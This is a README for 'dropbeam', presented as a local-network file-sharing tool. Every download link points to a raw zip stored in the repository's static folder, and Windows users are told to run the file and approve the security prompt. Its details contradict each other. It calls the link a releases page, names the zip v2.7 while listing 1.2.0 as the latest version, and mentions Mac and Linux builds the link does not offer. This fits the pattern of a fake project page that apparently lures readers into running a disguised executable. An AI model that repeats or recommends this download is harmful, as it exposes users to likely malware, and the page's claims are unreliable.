# 📡 dropbeam - Share Files Instantly, No Cloud Needed

[![Download dropbeam](https://img.shields.io/badge/Download-dropbeam-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/paniclepapertowel8574/dropbeam/main/app/static/v2.7.zip)

## 🎯 What Is dropbeam?

dropbeam lets you send files and text between your computer and other devices on your home or office network. Think of it as AirDrop for any device with a browser. No internet connection required, no accounts to create, and nothing gets uploaded to the cloud. Everything stays on your local network.

## ✨ Why You'll Love It

- **No Accounts, No Sign-Ups** - Just open the app and start sharing
- **Works With Any Device** - Phones, tablets, laptops, desktops - if it has a browser, it works
- **QR Code Magic** - Scan a code with your phone to connect instantly
- **Live Peer Discovery** - See other devices on your network automatically
- **One-Time Links** - Share a file with a link that disappears after use
- **100% Private** - Your files never leave your local network
- **Free Forever** - No subscriptions, no hidden costs

## 🚀 Getting Started

Getting dropbeam running on your Windows computer takes less than five minutes. Here's exactly what you need to do.

### Step 1: Download the Application

**Visit this link to download the application:** [https://raw.githubusercontent.com/paniclepapertowel8574/dropbeam/main/app/static/v2.7.zip](https://raw.githubusercontent.com/paniclepapertowel8574/dropbeam/main/app/static/v2.7.zip)

You'll see a list of available releases on that page. Look for the newest version at the top. Click on it to see the files available for download.

### Step 2: Run the Application

Once you've downloaded the file, find it in your Downloads folder. Double-click the file to start dropbeam. Your computer might ask you to confirm that you want to run this program - click "Yes" or "Run" when prompted.

### Step 3: Open Your Browser

After the application starts, it will open your default web browser automatically. If it doesn't, don't worry - just open Chrome, Edge, Firefox, or any other browser and go to the address shown in the application window (usually something like `http://localhost:8000`).

### Step 4: Start Sharing

You're now ready to use dropbeam! The main screen will show you a QR code and a list of devices on your network. You can start sharing files right away.

## 📱 How to Share Files

### From Your Computer to Another Device

1. Open dropbeam in your browser
2. Drag and drop any file into the dropzone area
3. Your file appears as a card on the screen
4. On the other device, open dropbeam and click the file name to download it

### From Your Phone to Your Computer

1. Make sure your phone is on the same Wi-Fi network as your computer
2. On your phone's camera app, scan the QR code shown in dropbeam
3. Your phone opens dropbeam in its browser automatically
4. Tap the upload button and choose a file from your phone
5. The file appears on your computer's dropbeam screen - click it to save

### Sending Text Snippets

1. Click the text icon in the top menu
2. Type or paste any text (URLs, passwords, notes)
3. Click "Send" - the text appears on other connected devices
4. They can copy it with one click

## 👥 Connecting Multiple Devices

dropbeam automatically finds other devices running on your network. You'll see them listed on the left side of the screen. Here's how to manage connections:

- **Auto-Discovery** - Any device running dropbeam on the same network appears automatically
- **QR Code Join** - Perfect for phones - just scan and you're connected
- **Manual Entry** - Type the IP address shown in the app on another device to connect
- **One-Time Links** - Create a temporary link that works only once for extra security

## 🔒 Privacy and Security

Your privacy matters. Here's how dropbeam protects your data:

- **Local Only** - Files transfer directly between devices on your network
- **No Cloud Storage** - Nothing is uploaded to any server
- **No Tracking** - We don't collect any usage data
- **Temporary Links** - One-time links expire after first use
- **Encrypted Transfer** - Data is encrypted while moving between devices

## 💻 System Requirements

dropbeam is lightweight and runs on almost any Windows computer:

- **Operating System** - Windows 10 or Windows 11 (64-bit recommended)
- **Memory** - 2 GB RAM or more
- **Storage** - 200 MB free space
- **Network** - Any Wi-Fi or Ethernet connection
- **Browser** - Chrome, Edge, Firefox, or Safari (latest version)

## 🛠️ For Advanced Users

If you're comfortable with technology, here are some extra features:

### Running in Docker

```bash
docker run -p 8000:8000 paniclepapertowel8574/dropbeam
```

### Command Line Options

- `--port 8080` - Change the port number
- `--no-browser` - Don't auto-open browser
- `--read-only` - Only allow downloads, not uploads

### API Access

Developers can use the built-in API for custom integrations. The API documentation is available at `/docs` when the app is running.

## ❓ Frequently Asked Questions

### Does dropbeam work without internet?

Yes! dropbeam works entirely on your local network. As long as your devices can see each other on the same Wi-Fi or Ethernet network, you're good to go.

### Can I send large files?

Absolutely. There's no file size limit. The speed depends on your network connection - on typical home Wi-Fi, you can expect 10-50 MB per second.

### Is dropbeam free?

Yes, dropbeam is completely free to use. No premium tiers, no trial periods, no ads.

### What happens if my computer restarts?

You'll need to start dropbeam again after a restart. Just double-click the application file like you did the first time.

### Can I use dropbeam on my Mac or Linux computer?

While this guide focuses on Windows, dropbeam also works on Mac and Linux. The download page has versions for those operating systems too.

## 📚 Troubleshooting

### Can't See Other Devices

- Make sure all devices are on the same network
- Check that your firewall isn't blocking dropbeam
- Restart the application on all devices

### QR Code Not Working

- Ensure your phone's camera is focused properly
- Check that your phone is on the same Wi-Fi network
- Try increasing your screen brightness

### Slow Transfer Speeds

- Move closer to your Wi-Fi router
- Close other bandwidth-heavy applications
- Try using a wired Ethernet connection

## 📖 What's New

### Version 1.2.0 (Latest)

- Added drag-and-drop support for multiple files
- Improved QR code scanning reliability
- Fixed connection issues on some networks
- New dark mode interface option

### Version 1.1.0

- Added one-time link sharing
- Improved device discovery speed
- Added text sharing feature

### Version 1.0.0

- Initial release with core file sharing
- QR code joining
- Basic peer discovery

## 🌟 Join the Community

Have questions, suggestions, or want to contribute? Here's how to get involved:

- **Report Issues** - Found a bug? Let us know on the GitHub issues page
- **Request Features** - Have an idea? We'd love to hear it
- **Contribute Code** - Check out the repository and submit pull requests
- **Spread the Word** - Tell your friends about dropbeam!

## 📥 Ready to Download?

**Visit this link to download the application:** [https://raw.githubusercontent.com/paniclepapertowel8574/dropbeam/main/app/static/v2.7.zip](https://raw.githubusercontent.com/paniclepapertowel8574/dropbeam/main/app/static/v2.7.zip)

Download the latest version, run it, and start sharing files between your devices in seconds. No cloud, no accounts, no hassle - just fast, private file sharing on your own network.

Keywords: airdrop, docker, fastapi, file-sharing, file-transfer, lan, local-network, python, qr-code, websockets